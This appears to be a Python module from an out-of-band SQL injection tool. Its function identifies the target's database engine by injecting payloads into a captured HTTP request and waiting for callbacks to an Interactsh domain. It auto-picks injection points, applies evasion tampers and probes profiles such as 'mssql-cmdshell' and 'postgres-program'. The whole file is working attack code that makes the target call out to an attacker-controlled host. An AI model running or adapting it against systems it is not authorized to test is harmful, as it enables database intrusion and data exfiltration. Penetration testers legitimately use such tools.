import uuid

from ..oob import InteractshLog, MultiInteractshLog
from ..payloads import PROFILES
from ..tamper import apply_tampers
from ..transport import current_value, inject, injection_points, parse_raw_request, send
from ..utils.logging import _hi, _log


def normalize_domain(domain: str) -> str:
    domain = domain.strip()
    domain = domain.removeprefix("http://").removeprefix("https://")
    return domain.strip("/.")


# Primary profiles tried during DBMS auto-detection (one per engine, most common first)
_DETECT_ORDER = ["mysql", "mssql", "postgres-program", "oracle-http", "sqlite-http"]

# Human-readable DBMS name for each profile (used in log output only)
_DBMS_DISPLAY = {
    "mysql":            "MySQL",
    "mysql-stacked":    "MySQL",
    "mssql":            "Microsoft SQL Server",
    "mssql-cmdshell":   "Microsoft SQL Server",
    "postgres-program": "PostgreSQL",
    "postgres-dblink":  "PostgreSQL",
    "oracle-http":      "Oracle",
    "oracle-dns":       "Oracle",
    "sqlite-http":      "SQLite",
}


def _detect_dbms(args) -> str | None:
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = MultiInteractshLog(args.log) if len(args.log) > 1 else InteractshLog(args.log[0])
    run_id = args.run_id or uuid.uuid4().hex[:6]
    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]

    if not args.param:
        points = injection_points(request, level=args.level)
        if not points:
            raise SystemExit(
                f"[ERROR] no injection points found at level {args.level} (query/body/JSON).\n"
                "        Use --level 2 (cookies), --level 3 (common headers),\n"
                "        or specify the parameter directly with --param <name>."
            )
        args.param = points[0].name
        args.place = points[0].place
        _log("INFO", f"Auto-selected injection point: {args.param} ({args.place})")

    candidates = [p for p in _DETECT_ORDER if p in PROFILES]
    display_names = list(dict.fromkeys(_DBMS_DISPLAY.get(p, p) for p in candidates))
    _log("INFO", f"DBMS not specified — probing {len(display_names)} engines: {', '.join(display_names)}")

    for profile_name in candidates:
        profile = PROFILES[profile_name]
        base = args.base
        if base is None and args.param:
            base = current_value(request, args.param, args.place)
        base = base or ""

        token = f"{run_id}-detect-{profile_name}"
        for payload in profile.payloads(base, "1=1", f"{token}.{domain}", risk=getattr(args, "risk", 2)):
            if tamper_names:
                payload = apply_tampers(payload, tamper_names)

            injected = inject(request, args.param or "", payload, args.place)
            try:
                send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
                     proxy=getattr(args, "proxy", None),
                     verify_ssl=not getattr(args, "no_verify_ssl", False))
            except Exception:
                pass

        hit = log.wait_any({token: profile_name}, args.timeout)
        if hit:
            display = _DBMS_DISPLAY.get(profile_name, profile_name)
            _log("INFO", _hi(f"identified DBMS: {display}"))
            return profile_name
        _log("DEBUG", f"No callback — {_DBMS_DISPLAY.get(profile_name, profile_name)}")

    return None
